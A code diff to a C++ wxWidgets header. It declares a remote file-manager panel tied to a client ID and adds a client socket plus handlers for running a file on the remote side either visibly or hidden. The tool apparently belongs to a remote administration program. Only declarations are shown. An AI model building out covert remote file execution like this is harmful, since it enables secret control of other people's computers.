@@ -24,6 +24,7 @@ class panelFileManager: public wxPanel{
 		wxStaticText* p_RutaActual = nullptr;
 		std::vector<wxString> c_RutaActual;
 		std::string strID = "";  //ID del cliente
+		SOCKET sckCliente = INVALID_SOCKET;
 
 	private:
 		wxToolBar* p_ToolBar = nullptr;
@@ -47,6 +48,7 @@ class ListCtrlManager : public wxListCtrl {
 		void OnContextMenu(wxContextMenuEvent& event);
 
 		std::string ArchivoSeleccionado();
+		std::string CarpetaActual();
 
 		//Eventos acciones menu contextual
 		void OnCrearFolder(wxCommandEvent& event);
@@ -54,6 +56,8 @@ class ListCtrlManager : public wxListCtrl {
 		void OnBorrarArchivo(wxCommandEvent& event);
 		void OnEditarArchivo(wxCommandEvent& event);
 		void OnDescargarArchivo(wxCommandEvent& event);
+		void OnEjecutarArchivo_Visible(wxCommandEvent& event);
+		void OnEjecutarArchivo_Oculto(wxCommandEvent& event);
 		void OnSubirArchivo(wxCommandEvent& event);
 
 		wxDECLARE_EVENT_TABLE();
